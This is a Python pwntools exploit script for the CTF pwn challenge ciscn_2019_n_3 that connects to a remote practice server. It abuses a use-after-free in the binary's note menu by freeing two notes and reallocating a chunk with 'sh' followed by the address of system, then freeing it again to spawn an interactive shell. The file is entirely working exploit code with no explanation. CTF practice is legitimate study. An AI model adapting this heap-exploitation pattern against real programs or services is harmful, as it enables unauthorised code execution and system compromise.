from pwn import *


ld_path = ""
libc_path = ""
# p = process([ld_path, ""], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("./ciscn_2019_n_3")
p = remote("node4.buuoj.cn", 29482)
pro = ELF("./ciscn_2019_n_3")

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def new(index, tp, value, size, con):
    sla("CNote > ", "1")
    sla("Index > ", str(index))
    sla("Type > ", str(tp))
    if tp == 1:
        sla("Value > ", str(value))
    else:
        sla("Length > ", str(size))
        sla("Value > ", con)

def free(index):
    sla("CNote > ", "2")
    sla("Index > ", str(index))

def show(index): 
    sla("CNote > ", "3")
    sla("Index > ", str(index))


system = pro.plt["system"]

# uaf
new(0, 2, 0, 0x20, "aaaa")
new(1, 2, 0, 0x20, "bbbb")
free(0)
free(1)
new(2, 2, 0, 0xc, b"sh\x00\x00"+p32(system))
free(0)

shell()


